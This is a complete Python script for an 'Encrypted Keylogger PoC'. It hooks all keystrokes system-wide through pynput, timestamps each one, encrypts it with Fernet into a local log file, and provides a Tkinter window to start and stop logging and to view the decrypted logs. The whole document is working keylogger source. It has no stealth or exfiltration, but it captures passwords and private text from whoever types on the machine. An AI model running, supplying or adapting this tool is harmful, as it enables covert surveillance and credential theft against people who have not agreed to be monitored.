import os
import threading
import time
from tkinter import *
from tkinter import messagebox, scrolledtext
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime

LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "encrypted_keys.log")
KEY_FILE = "key.key"
fernet = None
listener = None
stop_logging = False

# Create logs dir if missing
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Load or generate encryption key
def load_key():
    global fernet
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as f:
            f.write(key)
    else:
        with open(KEY_FILE, "rb") as f:
            key = f.read()
    fernet = Fernet(key)

# Key press handler
def on_press(key):
    global stop_logging
    if stop_logging:
        return False
    try:
        key_str = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {key.char}"
    except AttributeError:
        key_str = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {str(key)}"
    encrypted_data = fernet.encrypt(key_str.encode())
    with open(LOG_FILE, "ab") as f:
        f.write(encrypted_data + b"\n")

# Start keylogger thread
def start_keylogger():
    global listener, stop_logging
    stop_logging = False
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    messagebox.showinfo("Started", "Keylogger started.")

# Stop the keylogger
def stop_keylogger():
    global stop_logging, listener
    stop_logging = True
    if listener is not None:
        listener.stop()
    messagebox.showinfo("Stopped", "Keylogger stopped.")

# Decrypt and show logs
def view_logs():
    if not os.path.exists(LOG_FILE):
        messagebox.showwarning("No Logs", "No logs found.")
        return
    decrypted = []
    with open(LOG_FILE, "rb") as f:
        for line in f:
            try:
                msg = fernet.decrypt(line.strip()).decode()
                decrypted.append(msg)
            except:
                decrypted.append("[Decryption Failed]")
    log_window.delete(1.0, END)
    log_window.insert(INSERT, "\n".join(decrypted))

# GUI setup
load_key()
app = Tk()
app.title("Encrypted Keylogger PoC")
app.geometry("600x500")

Label(app, text="Encrypted Keylogger GUI", font=("Arial", 16)).pack(pady=10)
Button(app, text="Start Logging", command=start_keylogger, width=20, bg="green", fg="white").pack(pady=5)
Button(app, text="Stop Logging", command=stop_keylogger, width=20, bg="red", fg="white").pack(pady=5)
Button(app, text="View Decrypted Logs", command=view_logs, width=25).pack(pady=5)

log_window = scrolledtext.ScrolledText(app, width=70, height=20)
log_window.pack(pady=10)

app.mainloop()